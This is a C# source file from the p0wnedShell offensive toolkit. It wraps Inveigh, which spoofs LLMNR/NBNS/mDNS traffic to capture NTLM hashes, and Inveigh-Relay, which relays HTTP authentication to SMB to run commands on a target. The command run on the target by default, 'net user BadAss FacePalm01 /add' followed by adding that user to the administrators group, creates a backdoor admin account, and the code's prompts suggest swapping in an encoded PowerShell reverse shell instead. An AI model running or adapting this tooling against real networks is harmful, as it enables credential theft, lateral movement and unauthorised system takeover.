using System;
using System.IO;
using System.Net;

namespace p0wnedShell
{

    class Inveigh
    {
        private static P0wnedListenerConsole P0wnedListener = new P0wnedListenerConsole();

        public static void PowerBanner()
        {
            string[] toPrint = { "* Inveigh a PowerShell based LLMNR/mDNS/NBNS Spoofer/MITM tool.     *" };
            Program.PrintBanner(toPrint);
        }

        public static void Menu()
        {
            PowerBanner();
            Console.WriteLine(" 1. Start Invoke-Inveigh to capture NTLMv1/NTLMv2 Hashes from the Network");
            Console.WriteLine();
            Console.WriteLine(" 2. Use Inveigh-Relay for HTTP to SMB relaying with PsExec style Command Execution.");
            Console.WriteLine();
            Console.WriteLine(" 3. Get-Inveigh will get stored Inveigh data from memory.");
            Console.WriteLine();
            Console.WriteLine(" 4. Stop-Inveigh will stop all running Inveigh functions.");
            Console.WriteLine();
            Console.WriteLine(" 5. Back.");
            Console.Write("\nEnter choice: ");

            int userInput = 0;
            while (true)
            {
                try
                {
                    userInput = Convert.ToInt32(Console.ReadLine());
                    if (userInput < 1 || userInput > 5)
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("\n[+] Wrong choice, please try again!\n");
                        Console.ResetColor();
                        Console.Write("Enter choice: ");
                    }
                    else
                    {
                        break;
                    }
                }
                catch
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("\n[+] Wrong choice, please try again!\n");
                    Console.ResetColor();
                    Console.Write("Enter choice: ");
                }
            }

            switch (userInput)
            {
                case 1:
                    InvokeInveigh();
                    break;
                case 2:
                    InveighRelay();
                    break;
                case 3:
                    GetInveigh();
                    break;
                case 4:
                    StopInveigh();
                    break;
                default:
                    break;
            }
        }

        public static string InveighCommand()
        {
            string Command = "net user BadAss FacePalm01 /add && net localgroup administrators BadAss /add";
            return Command;
        }

        public static void InvokeInveigh()
        {
            string[] toPrint = { "* Start Invoke-Inveigh to capture NTLMv1/NTLMv2 Hashes.             *" };
            Program.PrintBanner(toPrint);

            string Invoke_Inveigh = null;
            string Priv = null;
            if (Program.IsElevated)
            {
                Invoke_Inveigh = "Invoke-Inveigh -ConsoleOutput Y -NBNS Y -mDNS Y -HTTPS Y -Proxy Y -FileOutput Y";
                Priv = "elevated";
            }
            else
            {
                Invoke_Inveigh = "Invoke-Inveigh -ConsoleOutput Y -NBNS Y -Proxy Y -FileOutput Y";
                Priv = "non elevated";
            }

            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("[+] Some Inveigh functions require (UAC) Elevated privileges.");
            Console.WriteLine("[+] You're running p0wnedShell currently in "+ Priv +" mode.\n");
            Console.ResetColor();

            try
            {
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("Output Logging will be saved in ./Inveigh-Log.txt\n");
                Console.ResetColor();
                P0wnedListener.Execute(Invoke_Inveigh);
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }

            Console.ReadLine();
            Console.Write("[+] Do you want to stop Inveigh from running in the background? (y/n) > ");
            Console.ForegroundColor = ConsoleColor.Green;

            string input = Console.ReadLine();
            switch (input.ToLower())
            {
                case "y":
                    string Stop_Inveigh = "Stop-Inveigh";
                    try
                    {
                        Console.WriteLine();
                        P0wnedListener.Execute(Stop_Inveigh);
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine(e.Message);
                    }
                    break;
                case "n":
                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine("\n[+] Use the Stop-Inveigh to manually stop it from running.");
                    Console.WriteLine("[+] Use Get-Inveigh to view Stored Inveigh data.");
                    break;
                default:
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("\n [!] Wrong choice, please try again!");
                    Console.ResetColor();
                    return;
            }

            Console.ResetColor();
            Console.WriteLine("\nPress Enter to Continue...");
            Console.ReadLine();
            return;
        }

        public static void InveighRelay()
        {
            string[] toPrint = { "* Use Inveigh-Relay for HTTP to SMB relaying.                       *" };
            Program.PrintBanner(toPrint);

            IPAddress TargetIP = IPAddress.Parse("1.1.1.1");

            while (true)
            {
                try
                {
                    Console.Write("[+] Enter the IP address of our target (e.g. 192.168.1.1): ");
                    Console.ForegroundColor = ConsoleColor.Green;
                    TargetIP = IPAddress.Parse(Console.ReadLine());
                    Console.ResetColor();
                    Console.WriteLine();
                    break;
                }
                catch
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("\n[+] That's not a valid IP address, Please Try again");
                    Console.ResetColor();
                }
            }

            string Command = InveighCommand();
            Console.WriteLine("[+] Default command we execute on our Target:\n");
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine(Command);
            Console.ResetColor();

            Console.Write("\n[+] Do you want to change the default command?  (y/n) > ");

            string input = Console.ReadLine();
            switch (input.ToLower())
            {
                case "y":
                    Console.WriteLine("\n[+] Enter command we want to execute on our Target.");
                    Console.WriteLine("[+] For example a Encoded PowerShell Reversed Shell Payload.");
                    Console.WriteLine("[+] We can create this with the Powercat module.\n");
  
                    //Change ReadLine Buffersize
                    Console.SetIn(new StreamReader(Console.OpenStandardInput(8192), Console.InputEncoding, false, 8192));
                    Command = Console.ReadLine();
                    break;
                case "n":                   
                    break;
                default:
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("\n [!] Wrong choice, please try again!");
                    Console.ResetColor();
                    return;
            }

            string Invoke_Inveigh = "Invoke-Inveigh -HTTP N -NBNS Y -ShowHelp N -StatusOutPut N";
            string Inveigh_Relay = "Invoke-InveighRelay -ConsoleOutput Y -Target " + TargetIP + " -Proxy Y -Command \"" + Command + "\" -FileOutput Y";

            try
            {
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("\nOutput Logging will be saved in ./Inveigh-Log.txt");
                Console.ResetColor();
                P0wnedListener.Execute(Invoke_Inveigh);
                Console.WriteLine();
                P0wnedListener.Execute(Inveigh_Relay);
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }

            Console.ReadLine();
            Console.Write("[+] Do you want to stop Inveigh from running in the background? (y/n) > ");
            Console.ForegroundColor = ConsoleColor.Green;

            input = Console.ReadLine();
            switch (input.ToLower())
            {
                case "y":
                    string Stop_Inveigh = "Stop-Inveigh";
                    try
                    {
                        Console.WriteLine();
                        P0wnedListener.Execute(Stop_Inveigh);
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine(e.Message);
                    }
                    break;
                case "n":
                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine("\n[+] Use the Stop-Inveigh to manually stop it from running.");
                    Console.WriteLine("[+] Use Get-Inveigh to view Stored Inveigh data.");
                    break;
                default:
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("\n [!] Wrong choice, please try again!");
                    Console.ResetColor();
                    return;
            }

            Console.ResetColor();
            Console.WriteLine("\nPress Enter to Continue...");
            Console.ReadLine();
            return;
        }

        public static void GetInveigh()
        {
            string[] toPrint = { "* Get-Inveigh will get stored Inveigh data from memory.             *" };

            Program.PrintBanner(toPrint);

            string Get_Inveigh = "Get-Inveigh";
            try
            {
                P0wnedListener.Execute(Get_Inveigh);
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }
            Console.WriteLine("\nPress Enter to Continue...");
            Console.ReadLine();
            return;
        }

        public static void StopInveigh()
        {
            string[] toPrint = { "* Stop-Inveigh will stop all running Inveigh functions.             *" };
            Program.PrintBanner(toPrint);

            Console.WriteLine("[+] Please wait while stopping Inveigh (if running)...\n");

            string Stop_Inveigh = "Stop-Inveigh";
            try
            {
                P0wnedListener.Execute(Stop_Inveigh);
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }
            Console.WriteLine("\nPress Enter to Continue...");
            Console.ReadLine();
            return;
        }

    }
}